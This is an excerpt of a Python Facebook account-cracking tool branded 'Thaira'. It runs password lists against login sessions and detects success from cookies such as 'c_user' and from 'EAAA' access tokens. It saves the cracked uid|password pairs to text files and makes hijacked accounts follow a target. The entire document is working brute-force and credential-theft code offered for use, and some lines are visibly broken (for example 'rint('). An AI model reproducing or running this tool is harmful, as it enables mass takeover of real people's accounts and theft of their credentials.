...
def crack(idf, pwv):
    ...
    fff = '%'
    (sys.stdout.write('\r %s[ Thaira ] %s\xe2\x80\xa2%s \xe2\x80\xa2 OK:%s \xe2\x80\xa2 CP:%s  ' % (bi, loop, len(id2), len(ok), cp)),)
    sys.stdout.flush()
    ...
    for pw in pwv:
        ...
        try:
            ...
            if 'checkpoint' in po.cookies.get_dict().keys():
                cp += 1
                print(f'''\r\x1b[1;91m [ Thaira-CP ] {idf} | {pw}''')
        ...
        if 'c_user' in ses.cookies.get_dict().keys():
            ...
            print(f'''\r\x1b[1;92m Thaira[ -OK ] {idf} | {pw}''')
            wrt = '%s - %s' % (idf, pw)
            ok.append(wrt)
...
def free(idf, pwv):
    ...
    for pw in pwv:
        ...
        try:
            ...
            if 'checkpoint' in po.cookies.get_dict().keys():
                rint(f'''\r\x1b[1;91m [ Thaira-CP ] {idf} | {pw}''')
                open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
                akun.append(idf + '|' + pw)
        finally:
            pass
        if 'c_user' in ses.cookies.get_dict().keys():
            ...
            wrt = '%s - %s' % (idf, pw)
            ok.append(wrt)
            open('/sdcard/Thaira-OK.txt', 'a').write('%s\n' % wrt)
            follow(ses, coki)
        continue
        requests.exceptions.ConnectionError
        time.sleep(31)
...
logo = ("""\033[91;1m
 ...
 ___________.__           .__               
 \__    ___/|  |__ _____  |__|___________   
   |    |   |  |  \\__  \ |  \_  __ \__  \  
   |    |   |   Y  \/ __ \|  ||  | \// __ \_
...
class Main:
	def __init__(self):
		...
		os.system("clear")
		print(logo)
		print("\033[91;1m [1] File Cloning")
		print("\033[91;1m [2] Public Cloning")
		print("\033[91;1m [3] Create File")
		print("\033[92;1m [4] 2009-10 Cloning")
		print("\033[92;1m [5] 2011-14 Cloning")
		print("\033[91;1m [E] Exit Programming\n")
		MRBX =input("\033[92;1m Choose : ")
		if MRBX in ["1", "01"]:
			File()
		if MRBX  in ["2", "02"]:
			Public()
...
"Mozilla/5.0 (Linux; Android 5.0; SM-G900V Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36",
		...
		sys.stdout.write(
			"\r [ Thaira ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[ Thaira-OK ] %s | %s\033[0;97m         "%(uid, pw))
				print ("\r \033[0;92m Congrats Bro ")
				self.ok.append("%s|%s"%(uid, pw))
				open("Thaira-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
				break
